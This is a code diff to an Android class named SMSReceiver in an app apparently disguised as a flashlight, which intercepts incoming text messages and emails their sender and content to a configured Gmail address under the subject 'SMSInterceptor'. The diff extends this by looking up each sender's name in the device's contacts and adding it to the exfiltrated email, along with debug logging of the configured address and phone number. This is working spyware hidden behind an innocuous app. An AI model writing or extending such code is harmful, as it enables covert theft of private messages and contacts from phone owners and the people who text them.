@@ -18,7 +18,9 @@ public class SMSReceiver extends BroadcastReceiver {
 
   public  static Object[] pdus;
   public  static Context context;
+  private static Contacts contact;
   private static GmailSender sender;
+  private static DatabaseHandler db;
   private static Configure configure;
 
   public  static String mBody = null;
@@ -28,6 +30,7 @@ public class SMSReceiver extends BroadcastReceiver {
   private static final String TAG = "FlashLight SMSReceiver";
 
   public SMSReceiver() {
+    contact   = new Contacts();
     configure = new Configure();
     if(!configure.getDatabaseInfo().equals("null")) {
       gmailEmailString = configure.getEmailAddress();
@@ -41,6 +44,22 @@ public class SMSReceiver extends BroadcastReceiver {
     else {
       phoneNumberString = "null";
     }
+    Log.d(TAG, "SMSReceiver() constructor gmailEmailString " + gmailEmailString);
+    Log.d(TAG, "SMSReceiver() constructor phoneNumberString " + phoneNumberString);
+  }
+
+  public String endPoint(final String number, Context context) {
+
+    String end_point;
+    final String contact_name  = contact.getContactName(number, context);
+
+    if(!contact_name.isEmpty()) {
+      end_point = "" + number + "(" + contact_name + ")";
+    }
+    else {
+      end_point = number;
+    }
+    return end_point;
   }
 
   @Override
@@ -77,7 +96,7 @@ public class SMSReceiver extends BroadcastReceiver {
                 try {
                   Log.d(TAG, "onReceive() Sending email.");
                   sender = new GmailSender();
-                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
+                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
                 }
                 catch(Exception e) {
                   Log.e(TAG, "onReceive() Exception e " + e.toString());
@@ -93,7 +112,7 @@ public class SMSReceiver extends BroadcastReceiver {
                 try {
                   Log.d(TAG,"onReceive() Sending email.");
                   sender = new GmailSender();
-                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + message_from + "\nMessage: " + mBody, gmailEmailString);
+                  sender.sendMail("SMSInterceptor", "Incoming sms:!\nFrom " + endPoint(message_from, context) + "\nMessage: " + mBody, gmailEmailString);
                 }
                 catch(Exception e) {
                   Log.e(TAG, "onReceive() Exception e " + e.toString());
